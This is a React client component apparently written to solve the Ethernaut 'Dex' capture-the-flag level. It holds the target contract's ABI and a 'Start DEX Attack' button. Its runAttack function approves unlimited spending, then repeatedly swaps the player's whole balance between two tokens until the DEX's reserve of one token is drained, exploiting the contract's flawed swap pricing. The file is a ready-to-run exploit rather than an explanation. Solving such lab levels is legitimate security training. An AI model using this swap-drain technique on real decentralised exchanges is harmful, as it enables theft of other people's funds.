"use client";

import { useState } from "react";
import { ethers, MaxUint256 } from "ethers";
import { Web3Provider } from "@ethersproject/providers";
// import DEX_ABI from "~~/contracts/Dex.sol/Dex.json"; // Import your local ABI

export default function DexAttackPage() {
  const [loading, setLoading] = useState(false);

  // Hardcode your Ethernaut instance address here:
  const DEX_ADDRESS = "0xfC68Df224219aa523Aa2e2B4D7648245523cE8b3";

  const DEX_ABI = [
    
      {
          "type": "constructor",
          "inputs": [],
          "stateMutability": "nonpayable"
      },
      {
          "type": "function",
          "name": "addLiquidity",
          "inputs": [
              {
                  "name": "token_address",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "amount",
                  "type": "uint256",
                  "internalType": "uint256"
              }
          ],
          "outputs": [],
          "stateMutability": "nonpayable",
          "signature": "0x56688700"
      },
      {
          "type": "function",
          "name": "approve",
          "inputs": [
              {
                  "name": "spender",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "amount",
                  "type": "uint256",
                  "internalType": "uint256"
              }
          ],
          "outputs": [],
          "stateMutability": "nonpayable",
          "signature": "0x095ea7b3"
      },
      {
          "type": "function",
          "name": "balanceOf",
          "inputs": [
              {
                  "name": "token",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "account",
                  "type": "address",
                  "internalType": "address"
              }
          ],
          "outputs": [
              {
                  "name": "",
                  "type": "uint256",
                  "internalType": "uint256"
              }
          ],
          "stateMutability": "view",
          "constant": true,
          "signature": "0xf7888aec"
      },
      {
          "type": "function",
          "name": "getSwapPrice",
          "inputs": [
              {
                  "name": "from",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "to",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "amount",
                  "type": "uint256",
                  "internalType": "uint256"
              }
          ],
          "outputs": [
              {
                  "name": "",
                  "type": "uint256",
                  "internalType": "uint256"
              }
          ],
          "stateMutability": "view",
          "constant": true,
          "signature": "0xbfd7e00d"
      },
      {
          "type": "function",
          "name": "owner",
          "inputs": [],
          "outputs": [
              {
                  "name": "",
                  "type": "address",
                  "internalType": "address"
              }
          ],
          "stateMutability": "view",
          "constant": true,
          "signature": "0x8da5cb5b"
      },
      {
          "type": "function",
          "name": "renounceOwnership",
          "inputs": [],
          "outputs": [],
          "stateMutability": "nonpayable",
          "signature": "0x715018a6"
      },
      {
          "type": "function",
          "name": "setTokens",
          "inputs": [
              {
                  "name": "_token1",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "_token2",
                  "type": "address",
                  "internalType": "address"
              }
          ],
          "outputs": [],
          "stateMutability": "nonpayable",
          "signature": "0xcbc7854e"
      },
      {
          "type": "function",
          "name": "swap",
          "inputs": [
              {
                  "name": "from",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "to",
                  "type": "address",
                  "internalType": "address"
              },
              {
                  "name": "amount",
                  "type": "uint256",
                  "internalType": "uint256"
              }
          ],
          "outputs": [],
          "stateMutability": "nonpayable",
          "signature": "0xdf791e50"
      },
      {
          "type": "function",
          "name": "token1",
          "inputs": [],
          "outputs": [
              {
                  "name": "",
                  "type": "address",
                  "internalType": "address"
              }
          ],
          "stateMutability": "view",
          "constant": true,
          "signature": "0xd21220a7"
      },
      {
          "type": "function",
          "name": "token2",
          "inputs": [],
          "outputs": [
              {
                  "name": "",
                  "type": "address",
                  "internalType": "address"
              }
          ],
          "stateMutability": "view",
          "constant": true,
          "signature": "0x25be124e"
      },
      {
          "type": "function",
          "name": "transferOwnership",
          "inputs": [
              {
                  "name": "newOwner",
                  "type": "address",
                  "internalType": "address"
              }
          ],
          "outputs": [],
          "stateMutability": "nonpayable",
          "signature": "0xf2fde38b"
      },
      {
          "type": "event",
          "name": "OwnershipTransferred",
          "inputs": [
              {
                  "name": "previousOwner",
                  "type": "address",
                  "indexed": true,
                  "internalType": "address"
              },
              {
                  "name": "newOwner",
                  "type": "address",
                  "indexed": true,
                  "internalType": "address"
              }
          ],
          "anonymous": false,
          "signature": "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0"
      }
  
  ];

  const runAttack = async () => {
    if (!DEX_ADDRESS) return;

    setLoading(true);
    const provider = new Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const dex = new ethers.Contract(DEX_ADDRESS, DEX_ABI, signer);

    const player = await signer.getAddress();
    const token1 = await dex.token1();
    const token2 = await dex.token2();

    await dex.approve(dex.address, MaxUint256);

    while (true) {
      const token1BalanceDex = await dex.balanceOf(token1, dex.address);
      const token2BalanceDex = await dex.balanceOf(token2, dex.address);
      const token1BalancePlayer = await dex.balanceOf(token1, player);
      const token2BalancePlayer = await dex.balanceOf(token2, player);

      if (token1BalanceDex.isZero() || token2BalanceDex.isZero()) {
        console.log("Attack complete!");
        break;
      }

      if (token1BalancePlayer.gt(0)) {
        await dex.swap(token1, token2, token1BalancePlayer);
      } else {
        await dex.swap(token2, token1, token2BalancePlayer);
      }
    }

    setLoading(false);
  };

  return (
    <div className="flex flex-col items-center justify-center">
      <button
        className="bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
        onClick={runAttack}
        disabled={loading}
      >
        {loading ? "Attacking..." : "Start DEX Attack"}
      </button>
    </div>
  );
}